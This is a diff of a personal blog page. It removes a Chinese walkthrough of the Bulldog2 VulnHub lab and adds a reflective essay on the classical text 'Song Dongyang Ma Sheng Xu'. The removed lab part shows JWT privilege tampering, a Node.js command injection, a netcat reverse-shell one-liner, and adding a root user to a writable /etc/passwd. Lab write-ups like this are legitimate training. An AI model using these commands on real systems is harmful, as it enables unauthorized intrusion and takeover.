@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="不问去留">
 <meta name="theme-color" content="#000">
-<title>渗透测试之bulldog2 | DAMOXILAI</title>
+<title>回首《送东阳马生序》 | DAMOXILAI</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1630336420480">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -41,8 +41,8 @@
 
 
 
-  <meta name="description" content="渗透测试之bulldog2" />
-  <meta name="keywords" content="内网渗透" />
+  <meta name="description" content="回首《送东阳马生序》" />
+  <meta name="keywords" content="" />
 </head>
 
 <body>
@@ -193,8 +193,7 @@
       <div class="sidebar-body gemini" id="sidebar_body">
         
           
-            <div class="post-side-meta" id="post_side_meta">
-              
+            
 <div class="sidebar-wrapper box-shadow-wrapper bg-color">
   <div class="sidebar-item">
     <img class="site-author-image right-motion" src="/images/avatar.png"/>
@@ -241,219 +240,6 @@
   </div>
 
 </div>
-            </div>
-            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
-              <div class="toc-box right-motion">
-  <div class="toc-wrapper auto-number auto"
-    id="toc_wrapper">
-    <ul class="markdownIt-TOC">
-<li>
-<ul>
-<li><a href="#%E4%B8%80-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83">一、实验环境</a></li>
-<li><a href="#%E4%BA%8C-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4">二、实验步骤</a><br>
-*
-<ul>
-<li><a href="#1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">(1)信息收集</a>
-<ul>
-<li><a href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0">1、主机发现</a></li>
-<li><a href="#2%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%89%AB%E6%8F%8F">2.端口扫描操作系统扫描</a></li>
-</ul>
-</li>
-<li><a href="#2web%E6%B8%97%E9%80%8F">(2)Web渗透</a>
-<ul>
-<li><a href="#1%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3">1.访问80端口</a></li>
-<li><a href="#2%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95">2.扫描目录</a></li>
-<li><a href="#3%E5%AE%A1%E8%AE%A1js%E4%BB%A3%E7%A0%81">3.审计js代码</a></li>
-<li><a href="#4%E4%BC%AA%E9%80%A0%E6%95%B0%E6%8D%AE%E5%8C%85">4.伪造数据包</a></li>
-<li><a href="#5%E7%99%BB%E9%99%86">5.登陆</a></li>
-<li><a href="#6%E8%A7%A3%E5%AF%86tonken%E5%B9%B6%E4%BF%AE%E6%94%B9">6.解密tonken并修改</a></li>
-<li><a href="#7%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BC%B9shell">7.命令执行漏洞 反弹shell</a></li>
-<li><a href="#8%E6%8F%90%E6%9D%83">8.提权</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><a href="#%E4%B8%89-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93">三、实验总结</a></li>
-</ul>
-</li>
-</ul>
-
-  </div>
-</div>
-
-<script>
-
-  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
-  let active = 'active-show', activeClass = 'active-current';
-  let tocWrapper = document.querySelector('#toc_wrapper');
-  let tocContent = tocWrapper.children[0];
-  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');
-
-  function addTocNumber(elem, deep) {
-    if (!elem) {
-      return;
-    }
-    let prop = elem.__proto__;
-
-    if (prop === HTMLUListElement.prototype) {
-      for (let i = 0; i < elem.children.length; i++) {
-        addTocNumber(elem.children[i], deep + (i + 1) + '.');
-      }
-    } else if (prop === HTMLLIElement.prototype) {
-      // 保存li元素
-      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
-        lList.push(elem);
-      }
-      for (let i = 0; i < elem.children.length; i++) {
-        let cur = elem.children[i];
-        if (cur.__proto__ === HTMLAnchorElement.prototype) {
-          if (autoNumber) {
-            cur.text = deep + ' ' + cur.text;
-          }
-        } else if (cur.__proto__ === HTMLUListElement.prototype) {
-          addTocNumber(cur, deep);
-        }
-      }
-    }
-  }
-
-  function removeParentActiveClass() {
-    let parents = tocContent.querySelectorAll('.' + active)
-    parents.forEach(function (elem) {
-      elem.classList.remove(active);
-    });
-  }
-
-  function addActiveClass(index) {
-    if (index >= 0 && index < hList.length) {
-      lList[index].classList.add(activeClass);
-    }
-  }
-
-  function removeActiveClass(index) {
-    if (index >= 0 && index < hList.length) {
-      lList[index].classList.remove(activeClass);
-    }
-  }
-
-  function addActiveLiElemment(elem, parent) {
-    if (!elem || elem === parent) {
-      return;
-    } else {
-      if (elem.__proto__ === HTMLLIElement.prototype) {
-        elem.classList.add(active);
-      }
-      addActiveLiElemment(elem.parentElement, parent);
-    }
-  }
-
-  function showToc() {
-    if (tocWrapper) {
-      postBody = document.querySelector('#post_body');
-      for (let i = 0; i < postBody.children.length; i++) {
-        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
-          hList.push(postBody.children[i]);
-        }
-      }
-      if (tocWrapper.classList.contains('compress')) {
-        tocContent.classList.add('closed');
-      } else if (tocWrapper.classList.contains('no_compress')) {
-        tocContent.classList.add('expanded');
-      } else {
-        if (hList.length > 10) {
-          active = 'active-hidden'
-          tocContent.classList.add('closed');
-        } else {
-          tocContent.classList.add('expanded');
-        }
-      }
-    }
-  }
-
-  (function () {
-    // 处理不是从#一级标题开始目录
-    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
-      let con = tocContent.children[0].children[0];
-      tocContent.innerHTML = con.innerHTML;
-    }
-    let markdownItTOC = document.querySelector('.markdownIt-TOC');
-    let innerHeight = window.innerHeight;
-    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
-    addTocNumber(tocContent, '');
-  })();
-
-  document.addEventListener('scroll', function (e) {
-    if (lList.length <= 0) {
-      return;
-    }
-    let scrollTop = document.scrollingElement.scrollTop + 10;
-    let dir;
-
-    if (lastTop - scrollTop > 0) {
-      dir = 'up';
-    } else {
-      dir = 'down';
-    }
-
-    lastTop = scrollTop;
-    if (scrollTop <= 0) {
-      if (lastIndex >= 0 && lastIndex < hList.length) {
-        lList[lastIndex].classList.remove(activeClass);
-      }
-      return;
-    }
-
-    let current = 0, hasFind = false;
-    for (let i = 0; i < hList.length; i++) {
-      if (hList[i].offsetTop > scrollTop) {
-        current = i;
-        hasFind = true;
-        break;
-      }
-    }
-    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
-      current = hList.length - 1;
-    } else {
-      current--;
-    }
-    if (dir === 'down') {
-      if (current > lastIndex) {
-        addActiveClass(current);
-        removeActiveClass(lastIndex)
-        lastIndex = current;
-        removeParentActiveClass();
-        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
-      }
-    } else {
-      if (current < lastIndex) {
-        addActiveClass(current);
-        removeActiveClass(lastIndex);
-        lastIndex = current;
-        removeParentActiveClass();
-        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
-      }
-    }
-  });
-
-
-  window.addEventListener('load', function () {
-    showToc();
-    document.querySelector('#sidebar').style = 'display: block;';
-    tocWrapper.classList.add('toc-active');
-    setTimeout(function () {
-      if ("createEvent" in document) {
-        let evt = document.createEvent("HTMLEvents");
-        evt.initEvent("scroll", false, true);
-        document.dispatchEvent(evt);
-      }
-      else {
-        document.fireEvent("scroll");
-      }
-    }, 500)
-  })
-
-</script>
-            </div>
           
         
       </div>
@@ -541,8 +327,8 @@
           <div class="section bg-color post post-page">
             <section class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog2/">
-      渗透测试之bulldog2
+    <a class="post-title-link" href="https://damoxilai.github.io/post/hui-shou-lesslesssong-dong-yang-ma-sheng-xu-greatergreater/">
+      回首《送东阳马生序》
     </a>
   </h1>
   <div class="post-meta">
@@ -550,22 +336,9 @@
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span class="language" data-lan="publish">发布于</span>
-      <span class="publish-time" data-t="2021-08-15 11:05:54">2021-08-15</span>
+      <span class="publish-time" data-t="2021-08-26 21:17:16">2021-08-26</span>
       <span class="post-meta-divider pc-show">|</span>
     </span>
-    
-    <span class="meta-item">
-      <i class="fa fa-folder-o"></i>
-      <span class="pc-show language" data-lan="category-in">分类于</span>
-      
-      
-      <a href="https://damoxilai.github.io/tag/ZkSgQhLUS/">
-        <span>内网渗透</span>
-      </a>
-      
-      
-    </span>
-    <span class="post-meta-divider">|</span>
     
     <span class="meta-item">
       <i class="fa fa-clock-o"></i>
@@ -574,135 +347,44 @@
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>962<span class="pc-show language" data-lan="words">字数</span></span>
+      <span>1449<span class="pc-show language" data-lan="words">字数</span></span>
     </span>
     
   </div>
 </section>
             <div class="post-body next-md-body" id="post_body">
-              <h2 id="一-实验环境">一、实验环境</h2>
-<ol>
-<li>
-<p>靶机下载:</p>
-<p>http://download.vulnhub.com/bulldog/Bulldog2.ova</p>
-<p>或http://download.vulnhub.com/bulldog/Bulldog2.ova.torrent</p>
-</li>
-<li>
-<p>靶机：ip暂未知</p>
-</li>
-<li>
-<p>攻击机kali：192.168.0.150</p>
-</li>
-</ol>
-<h2 id="二-实验步骤">二、实验步骤</h2>
-<h4 id="1信息收集">(1)信息收集</h4>
-<h5 id="1-主机发现">1、主机发现</h5>
-<figure data-type="image" tabindex="1"><img src="https://damoxilai.github.io/post-images/1629125130606.png" alt="" loading="lazy"></figure>
-<p><em><strong>找到目标主机：192.168.0.101</strong></em></p>
-<h5 id="2端口扫描操作系统扫描">2.端口扫描操作系统扫描</h5>
-<figure data-type="image" tabindex="2"><img src="https://damoxilai.github.io/post-images/1629125142020.png" alt="" loading="lazy"></figure>
-<p><em><strong>为防止漏扫，多扫描几次，可发现主机80端口开放http服务，Linux操作系统</strong></em></p>
-<hr>
-<h4 id="2web渗透">(2)Web渗透</h4>
-<h5 id="1访问80端口">1.访问80端口</h5>
-<figure data-type="image" tabindex="3"><img src="https://damoxilai.github.io/post-images/1629125159984.png" alt="" loading="lazy"></figure>
-<p>没有什么收获</p>
-<h5 id="2扫描目录">2.扫描目录</h5>
-<figure data-type="image" tabindex="4"><img src="https://damoxilai.github.io/post-images/1629125168354.png" alt="" loading="lazy"></figure>
-<p>目录下没什么收获</p>
-<p>首页调用了四个js文件，突破口可能在js文件里</p>
-<p>访问该靶机80端口，查看其js，保存本地并用网上js美化工具把代码美化一下😂</p>
-<h5 id="3审计js代码">3.审计js代码</h5>
-<p>拿到代码，联想到刚才首页注册不了，注册页面功能没有。查看”register“关键字，有所发现：</p>
-<figure data-type="image" tabindex="5"><img src="https://damoxilai.github.io/post-images/1629125177725.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="6"><img src="https://damoxilai.github.io/post-images/1629125185501.png" alt="" loading="lazy"></figure>
-<p><em><strong>根据 js定义，我们可以使用 post提交来实现注册，但是注意</strong></em></p>
-<ul>
-<li><em><strong>Content-Type必须要是：application/json 格式</strong></em></li>
-<li><em><strong>post数据包内容必须按照js代码里的规范</strong></em></li>
-</ul>
-<h5 id="4伪造数据包">4.伪造数据包</h5>
-<p>我们打开burp，构造数据包，发送后注册成功</p>
-<figure data-type="image" tabindex="7"><img src="https://damoxilai.github.io/post-images/1629125193632.png" alt="" loading="lazy"></figure>
-<pre><code>{
-&quot;name&quot;: &quot;linan&quot;,
-
-&quot;email&quot;: &quot;linan@qq.com&quot;,
-
-&quot;username&quot;: &quot;linan&quot;,
-
-&quot;password&quot;: &quot;123456&quot;
-
-}
-</code></pre>
-<h5 id="5登陆">5.登陆</h5>
-<figure data-type="image" tabindex="8"><img src="https://damoxilai.github.io/post-images/1629125206673.png" alt="" loading="lazy"></figure>
-<p>登陆成功</p>
-<p>查看登陆抓包，发现可疑tonken</p>
-<figure data-type="image" tabindex="9"><img src="https://damoxilai.github.io/post-images/1629125218766.png" alt="" loading="lazy"></figure>
-<h5 id="6解密tonken并修改">6.解密tonken并修改</h5>
-<p>6.1根据提示，jwt解密</p>
-<p>网址：https://jwt.io</p>
-<figure data-type="image" tabindex="10"><img src="https://damoxilai.github.io/post-images/1629125229008.png" alt="" loading="lazy"></figure>
-<p>有一个payload的键值对，值是我们的用户信息，发现多一行&quot;auth_level&quot;: &quot;standard_user&quot;，凭字面意思应该是用户等级的标志，可能是以此来判断用户权限的，到js代码中找这个关键字。</p>
-<figure data-type="image" tabindex="11"><img src="https://damoxilai.github.io/post-images/1629125236285.png" alt="" loading="lazy"></figure>
-<pre><code>	if (&quot;master_admin_user&quot; == n.auth_level) return this.user = n, !0;
-</code></pre>
-<p>6.2把&quot;auth_level&quot;: &quot;<font color='orange'>standard_user</font>&quot;替换&quot;auth_level&quot;: &quot;<font color='orange'>master_admin_user</font>&quot;</p>
-<pre><code>{&quot;success&quot;:true,&quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJsaW5hbiIsImVtYWlsIjoibGluYW5AcXEuY29tIiwidXNlcm5hbWUiOiJsaW5hbiIsImF1dGhfbGV2ZWwiOiJtYXN0ZXJfYWRtaW5fdXNlciJ9LCJpYXQiOjE2Mjg5NDc0MzQsImV4cCI6MTYyOTU1MjIzNH0.7N4Xj5dQuGWsv6iTWEyuXCWSsJcotzdX_EtM-uQEEhc&quot;,&quot;user&quot;:{&quot;name&quot;:&quot;linan&quot;,&quot;username&quot;:&quot;linan&quot;,&quot;email&quot;:&quot;linan@qq.com&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;}
-</code></pre>
-<p>拦截返回的<font color='red'>response数据包</font>，修改tonken值</p>
-<p><img src="https://damoxilai.github.io/post-images/1629125245020.png" alt="" loading="lazy"><br>
-<img src="https://damoxilai.github.io/post-images/1629125253375.png" alt="" loading="lazy"></p>
-<p>发现页面右上角，已经变为admin</p>
-<figure data-type="image" tabindex="12"><img src="https://damoxilai.github.io/post-images/1629125263805.png" alt="" loading="lazy"></figure>
-<p><em><strong>说明存在垂直越权漏洞</strong></em></p>
-<h5 id="7命令执行漏洞-反弹shell">7.命令执行漏洞 反弹shell</h5>
-<p>7.1</p>
-<figure data-type="image" tabindex="13"><img src="https://damoxilai.github.io/post-images/1629125273521.png" alt="" loading="lazy"></figure>
-<p>在GitHub上搜索Bulldog-2-The-Reckoning的代码，密码处存在命令执行漏洞</p>
-<pre><code>user.js
-router.post('/linkauthenticate', (req, res, next) =&gt; {
-  const username = req.body.password;
-  const password = req.body.password;
-
-  exec(`linkplus -u ${username} -p ${password}`, (error, stdout, stderr) =&gt; {
-  if (error) {
-    console.error(`exec error: ${error}`);
-    return;
-  }
-  console.log(`stdout: ${stdout}`);
-  console.log(`stderr: ${stderr}`);});
-原文链接：https://blog.csdn.net/qq_42288123/article/details/103534109
-</code></pre>
-<p>7.2反弹shell安排</p>
-<p>命令：</p>
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.150 1234 &gt;/tmp/f
-</code></pre>
-<figure data-type="image" tabindex="14"><img src="https://damoxilai.github.io/post-images/1629125283051.png" alt="" loading="lazy"></figure>
-<p>得到shell</p>
-<figure data-type="image" tabindex="15"><img src="https://damoxilai.github.io/post-images/1629125291331.png" alt="" loading="lazy"></figure>
-<h5 id="8提权">8.提权</h5>
-<p>8.1进入/etc目录下，发现password文件的权限大得要命，意味着我们可以随意修改，写入一个管理员权限的用户</p>
-<figure data-type="image" tabindex="16"><img src="https://damoxilai.github.io/post-images/1629125301396.png" alt="" loading="lazy"></figure>
-<p>8.2可以仿照这个格式写入一个管理员权限的用户</p>
-<figure data-type="image" tabindex="17"><img src="https://damoxilai.github.io/post-images/1629125311329.png" alt="" loading="lazy"></figure>
-<p><strong>使用加密命令，得到一个加密后的密码。设定123456为加密的密码；aa表示使用的加密盐（可以有aa,sa,Fx等），如果不使用加密盐，那么输出的字符串将不是crypt加密格式，而是MD5加密格式的。所以，加密盐其实是必须的参数。</strong></p>
-<pre><code>perl -le 'print crypt(&quot;123456&quot;,&quot;aa&quot;)'
-</code></pre>
-<p>得到结果</p>
-<figure data-type="image" tabindex="18"><img src="https://damoxilai.github.io/post-images/1629125323459.png" alt="" loading="lazy"></figure>
-<p>8.3将linan这个用户写入passwd文件</p>
-<pre><code>echo 'linan:aaAN1ZUwjW7to:0:0:linan:/root:/bin/bash' &gt;&gt; passwd
-</code></pre>
-<p>写入成功</p>
-<p>8.4直接su/sudo不行，python调用一个新的本地终端，再来su，成功</p>
-<figure data-type="image" tabindex="19"><img src="https://damoxilai.github.io/post-images/1629125334960.png" alt="" loading="lazy"></figure>
-<h2 id="三-实验总结">三、实验总结</h2>
-<p>(1)js代码获取注册方法，POST方法传递application/json格式的注册信息</p>
-<p>(2)token中jwt解密，更改权限，实现垂直越权漏洞</p>
-<p>(3)Bulldog-2-The-Reckoning存在密码处命令执行漏洞，实现反弹shell</p>
-<p>(4)passwd有写权限，可依照root新建一个root权限的用户</p>
+              <p>宋濂，也叫宋景濂。有一个姓马的、来自东阳的、在太学已经两年的、自己很看好的这么一个学生，宋濂出于自己长辈对这个后辈的鼓励，写了这么一篇赠序。时隔五六年，虽是高中早读偶尔有读过，但当时没有余地去体会。当大二的我再度读起这篇文章，真的感觉词甚畅达，也体会到这文章真的很心酸、很励志、很自豪、也很谦卑。这些个感觉，比当时学这篇文章要来的深刻。</p>
+<p><strong>余幼时即<font color='red'>嗜</font>学。</strong></p>
+<p>请注意这个嗜字，我觉得用的非常好，我们所说到的嗜大都是贬义的，像嗜睡，嗜血之类，表示一种贪婪，贪得无厌。这里用的巧妙，贬词褒用。</p>
+<p><strong>家<font color='red'>贫</font>，无从致书以观，每假借于藏书之家，<font color='red'>手自笔录</font>，计日以还。</strong></p>
+<p>宋濂以前是这样的穷，穷只能向人家借，把它抄下来，再按期归还别人。像林肯总统，一本书要像人家借。以前没有书读的穷人家的孩子是多么渴望学习。</p>
+<p><strong>天大寒，<font color='red'>砚冰坚</font>，手指不可屈伸，<font color='red'>弗之怠</font>。</strong></p>
+<p>天冷了手僵了还不会停下，很勤奋很刻苦</p>
+<p><strong>录毕，走送之，不敢稍逾约。以是人多以书假余，余因得<font color='red'>遍观</font>群书。</strong></p>
+<p>守约，才有得书读，因为勤借勤写，读得书自然多了。</p>
+<p><strong>既<font color='red'>加冠</font>，益<font color='red'>慕</font>圣贤之道 ，又<font color='red'>患</font>无硕师、名人与游，尝趋百里外，从乡之先达执经叩问。先达德隆望尊，门人弟子填其室，未尝稍降辞色。</strong></p>
+<p><strong>余立侍左右，援疑质理，俯身倾耳以请；或遇其叱咄，<font color='red'>色愈恭，礼愈至</font>，不敢出一言以复；俟其欣悦，则又请焉。故余<font color='red'>虽愚</font>，卒获有所闻。</strong></p>
+<p>很是谦虚的求学态度，个人觉得过于卑躬屈膝，古今不同吧。但至少正真学到点东西。将近70岁的宋濂，官职之大地位之高，却完全没有那种自大的姿态，没有倚老卖老，面对后辈，实实在在的说自己曾经的愚钝，足以见得他的谦虚，是发自心里的话</p>
+<p><strong>当余之从师也，<font color='red'>负箧曳屣</font>行深山巨谷中，穷冬烈风，大雪深数尺，足肤皲裂而不知。至舍，四支僵劲不能动，媵人<font color='red'>持汤沃灌</font>，以<font color='red'>衾</font>拥覆，久而乃和。</strong></p>
+<p>负就是背，荷是扛，负箧曳屣就是背着框子，拖着鞋子。在大山行走。持汤沃灌，拿热水强行灌下。衾，就是大棉衣，布衾多年冷似铁。</p>
+<p><strong><font color='red'>寓逆旅</font>，主人日<font color='red'>再</font>食，无鲜肥滋味之享。</strong></p>
+<p>寓就是住，逆旅就是常说的旅店。再是两次的意思。鲜指鱼肉，肥就是肥肉。没有肉可以吃的宋濂好可怜</p>
+<p><strong>同舍生皆被绮绣，戴朱缨宝饰之帽，腰白玉之环，左佩刀，右备容臭，<font color='red'>烨然若神人</font>；余则<font color='red'>缊袍敝衣</font>处其间，<font color='red'>略无慕艳意</font>。<font color='orange'>以中有足乐者，不知口体之奉不若人也</font>。盖余之勤且艰若此。</strong></p>
+<p>同舍的学生都是神仙生活。唯独自己穿的破烂。但是不影响他的学习。因为学习当中有足以让自己开心的事 不觉得吃的穿的不如别人。宋濂有自己的一片天地，活出自己的姿态。他的态度是值得学习的。不知不若人不是压根不想要这样的生活，而是让自己做自己喜欢的事，不至于陷入这种不若他人的莫名的卑劣感中，有自己的主宰，是难能可贵的，是强者姿态。</p>
+<p><strong>今虽<font color='red'>耄老</font>，未有所成，<font color='red'>犹幸</font>预君子之列，而承天子之宠光，缀公卿之后，日侍坐备顾问，四海亦<font color='red'>谬称</font>其氏名，况才之过于余者乎？</strong></p>
+<p>七十岁了，自己的地位之高，用了犹幸，表示谦虚，用了谬称，表示谦虚，拿才能比得过自己的人，也是表示谦虚。七十岁了，怎么会这么谦虚，而且事对后辈，换做我怕是做不到。这是这个人美好的品格和魄力。</p>
+<p><strong>今诸生学于太学，县官日有廪稍之供，父母岁有裘葛之遗，无冻馁之患矣；坐大厦之下而诵诗书，无奔走之劳矣；有司业、博士为之师，<font color='red'>未有问而不告，求而不得者</font>也；</strong></p>
+<p>说了今天的大学生，条件之好，是当年自己远不能比的。无奔走之劳，问而告，求而得。这不是说当下的大学生么。</p>
+<p><strong>凡所宜有之书，皆集于此，不必若余之手录，假诸人而后见也。</strong></p>
+<p>凡是举国所有的名著，都集中在此地，不用像自己一样，要向别人借，拿来抄。这里又泛起一阵心酸</p>
+<p><strong>其业有不精，德有不成者，非天质之卑，则心不若余之专耳，<font color='red'>岂他人之过哉</font>！</strong></p>
+<p>最好的学习条件，还有学习不好的，宋某人要讨个说法</p>
+<p><strong>东阳马生君则，在太学已二年，流辈甚称其贤。</strong></p>
+<p>夸夸马君则</p>
+<p><strong>余朝京师，生以乡人子谒余，撰长书以为<font color='red'>贽</font>，<font color='red'>辞甚畅达</font>，与之论辨，<font color='red'>言和而色夷</font>。自谓少时用心于学甚劳，是可谓善学者矣！其将归见其亲也，余故道为学之难以告之。谓余勉乡人以学者，<font color='red'>余之志</font>也；</strong></p>
+<p>表达自己的意图</p>
+<p><strong>诋我夸际遇之盛而骄乡人者，岂知予者哉？</strong></p>
+<p>希望别人不要误解我，宋濂的思考很细腻，实在实在很是谦虚。</p>
 
             </div>
             
@@ -715,7 +397,7 @@ router.post('/linkauthenticate', (req, res, next) =&gt; {
     </li>
     <li class="post-copyright-link">
       <strong class="language" data-lan="link">本文链接：</strong>
-      <a href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog2/" title="渗透测试之bulldog2">https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog2/</a>
+      <a href="https://damoxilai.github.io/post/hui-shou-lesslesssong-dong-yang-ma-sheng-xu-greatergreater/" title="回首《送东阳马生序》">https://damoxilai.github.io/post/hui-shou-lesslesssong-dong-yang-ma-sheng-xu-greatergreater/</a>
     </li>
     <li class="post-copyright-license">
       <strong class="language" data-lan="copyright">版权声明： </strong>
@@ -724,21 +406,15 @@ router.post('/linkauthenticate', (req, res, next) =&gt; {
   </ul>
   <div class="tags">
     
-      <a href="https://damoxilai.github.io/tag/ZkSgQhLUS/"># 内网渗透</a>
-    
   </div>
   <div class="nav">
     <div class="nav-prev">
       
-        <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" title="渗透测试之Casino-Royale" href="https://damoxilai.github.io/post/1/">渗透测试之Casino-Royale</a class="nav-pc-next">
-        <a class="nav-mobile-prev" title="渗透测试之Casino-Royale" href="https://damoxilai.github.io/post/1/">上一篇</a>
-      
     </div>
     <div class="nav-next">
       
-        <a class="nav-pc-next" title="渗透测试之bulldog" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog/">渗透测试之bulldog</a>
-        <a class="nav-mobile-next" title="渗透测试之bulldog" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog/">下一篇</a>
+        <a class="nav-pc-next" title="渗透测试之DC6" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-dc6/">渗透测试之DC6</a>
+        <a class="nav-mobile-next" title="渗透测试之DC6" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-dc6/">下一篇</a>
         <i class="fa fa-chevron-right"></i>
       
     </div>
